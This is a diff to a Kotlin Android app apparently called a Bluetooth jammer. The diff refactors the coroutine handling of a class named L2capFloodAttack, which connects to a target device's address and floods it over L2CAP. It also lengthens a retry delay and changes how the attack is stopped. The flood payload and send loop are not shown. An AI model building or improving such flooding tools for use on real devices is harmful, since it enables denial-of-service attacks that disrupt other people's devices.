@@ -12,7 +12,9 @@ import com.eikarna.bluetoothjammer.AttackActivity
 import com.google.android.material.textview.MaterialTextView
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
 import kotlinx.coroutines.cancel
+import kotlinx.coroutines.cancelChildren
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import util.Logger
@@ -20,7 +22,7 @@ import java.io.IOException
 import java.util.UUID
 
 @SuppressLint("MissingPermission")
-class L2capFloodAttack(private val targetAddress: String)
+class L2capFloodAttack(private val targetAddress: String, private val scope: CoroutineScope)
 {
 	// Константы
 	companion object
@@ -33,8 +35,8 @@ class L2capFloodAttack(private val targetAddress: String)
 	// Состояние
 	private var bluetoothAdapter: BluetoothAdapter? = null
 	private var activeSocket: BluetoothSocket? = null
-	private var attackScope: CoroutineScope? = null
 	private var shouldStop = false
+	private var attackJob: Job? = null
 	private val sendBuffer by lazy { createPayloadBuffer() }
 
 	// Основной метод атаки
@@ -47,18 +49,12 @@ class L2capFloodAttack(private val targetAddress: String)
 		}
 
 		shouldStop = false
-		attackScope = CoroutineScope(Dispatchers.IO)
-
-		attackScope?.launch {
-			val uuid = establishConnection(targetDevice, context, logView) ?: return@launch
-
-			if(activeSocket?.isConnected == true)
-			{
+		attackJob = scope.launch(Dispatchers.IO) {
+			establishConnection(targetDevice, context, logView) ?: return@launch
+			if (activeSocket?.isConnected == true) {
 				logSuccess(context, logView, "Connection established. Starting flood attack...")
 				executeFloodAttack(logView)
-			}
-			else
-			{
+			} else {
 				logError(context, logView, "Failed to establish connection")
 			}
 		}
@@ -68,7 +64,8 @@ class L2capFloodAttack(private val targetAddress: String)
 	fun stopAttack()
 	{
 		shouldStop = true
-		attackScope?.cancel()
+		scope.cancel()
+		attackJob?.cancelChildren()
 		closeActiveConnection()
 		bluetoothAdapter?.startDiscovery()
 	}
@@ -92,7 +89,6 @@ class L2capFloodAttack(private val targetAddress: String)
 	): UUID?
 	{
 		var effectiveUUID = BASE_UUID
-
 		while(!shouldStop)
 		{
 			try
@@ -107,7 +103,7 @@ class L2capFloodAttack(private val targetAddress: String)
 			{
 				effectiveUUID = generateFallbackUuid()
 				logConnectionAttempt(context, logView, effectiveUUID)
-				delay(100) // Задержка между попытками
+				delay(300)
 			}
 		}
 		return null
